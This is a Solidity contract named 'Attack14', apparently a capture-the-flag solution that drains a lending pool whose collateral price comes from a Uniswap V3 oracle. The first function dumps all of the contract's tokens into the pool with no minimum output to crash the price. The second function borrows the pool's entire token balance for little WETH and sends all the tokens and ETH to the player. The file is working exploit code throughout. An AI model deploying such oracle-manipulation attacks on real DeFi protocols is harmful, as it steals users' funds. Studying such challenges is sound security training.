// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface IPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(
        uint256 amount
    ) external returns (uint256);
}

interface IWeth is IERC20 {
    function withdraw(uint wad) external;
}

contract Attack14 {
    IRouter private constant router =
        IRouter(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    IPool private immutable pool;
    IERC20 private immutable token;
    IWeth private immutable weth;
    address private immutable player;

    constructor(
        address _pool,
        address _token,
        address _weth,
        address _player
    ) payable {
        pool = IPool(_pool);
        token = IERC20(_token);
        weth = IWeth(_weth);
        player = _player;
    }

    receive() external payable {}

    function attack1() external {
        uint256 amount = token.balanceOf(address(this));
        token.approve(address(router), amount);

        router.exactInputSingle(
            IRouter.ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: address(weth),
                fee: 3000,
                recipient: address(this),
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function attack2() external {
        uint256 amount = pool.calculateDepositOfWETHRequired(
            token.balanceOf(address(pool))
        );
        weth.approve(address(pool), amount);
        pool.borrow(token.balanceOf(address(pool)));

        // Transfer everything back to player
        weth.withdraw(weth.balanceOf(address(this)));
        token.transfer(player, token.balanceOf(address(this)));
        (bool success, ) = player.call{value: address(this).balance}("");
        require(success, "Attack14: ETH transfer failed");
    }
}
